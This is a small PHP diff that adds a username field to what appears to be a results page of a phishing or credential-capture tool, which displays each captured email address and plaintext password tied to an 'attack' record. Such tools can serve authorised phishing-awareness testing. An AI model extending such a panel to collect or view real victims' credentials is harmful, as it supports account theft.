@@ -11,6 +11,7 @@ $row = $smt->fetch();
 if($row !== false){ //si no se creo el ataque, esta vacio y da error
     $uid = $row['user_uid'];
     $date = $row['captured_on'];
+    $username = $row['username'];
     $mail = $row['email_address'];
     $pass = $row['password'];
     $aid = $row['attack_id'];
@@ -68,6 +69,13 @@ if($row !== false){ //si no se creo el ataque, esta vacio y da error
                 <label for="staticEmail" class="col-sm-2 col-form-label">Email</label>
                 <div class="col-sm-5">
                     <input type="text" class="form-control" name="mail" id="email" value="<?php echo $mail ?>" readonly disabled>
+                </div>
+            </div>
+
+            <div class="mb-3 row">
+                <label for="staticEmail" class="col-sm-2 col-form-label">Nombre del usuario</label>
+                <div class="col-sm-5">
+                    <input type="text" class="form-control" name="username" id="username" value="<?php echo $username ?>" readonly disabled>
                 </div>
             </div>
 
